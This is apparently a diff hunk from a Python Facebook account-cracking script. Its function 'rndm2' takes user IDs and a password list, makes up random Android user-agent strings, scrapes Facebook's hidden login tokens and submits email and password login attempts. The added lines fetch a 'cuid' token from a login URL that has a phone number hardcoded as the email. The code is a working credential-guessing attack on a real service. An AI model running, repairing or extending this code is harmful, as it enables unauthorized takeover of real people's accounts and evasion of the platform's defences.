@@ -284,6 +284,10 @@ def rndm2(ids,passlist,mthd_svr,fb):
             lenovo = ("L18021","PAGK0027IN","L19111","L10041","A7010a48","K350t","K33a48","Lenovo K7","K8 Note","L38043","PAFR0026IN","Lenovo K11","Lenovo K12","Lenovo K13","Lenovo K14")
             ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(lenovo))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
             #ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
+            referer_url = 'https://www.facebook.com/login/web/?cuid=AYjpakrqTxrj5wFmV-QKHtvBbm2N0-lN7kL6BSohrV5OSxEQiELa8jUVPNKttxFGxP_fEKh2T4jjljwjvXxMxv_CLYnEqFpruZ4J2J-leEJbo7bKf5HIH2jW5aGCKe2zHZVeNfNwvo7aTAsQuFox5426R-oiVC3bV5-Mv6FylyvXu-4TlUVzq3_kNNNbXYJB95Elmh2S5rxVZGI6E8ORDJzoYWa9H2aU5wo4u9V5NE68uP6w4LXSEFcMbPZ91JWBUUznW4V3s0vc7lLiWt12J-cpexhphXL9pzjsXIURSjPNng&email=8389066877&is_from_lara=1'
+            cuidv = session.get(referer_url).text
+            cuid = {"cuid":re.search('name="cuid" value="(.*?)"', str(cuidv)).group(1),}
+            print(f"\r\r {b}[cuid-OK]{cuid}")
             git_fb = session.get(f"https://{fb}.facebook.com").text
             logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
             user_info = {'Host': f'{fb}.facebook.com',
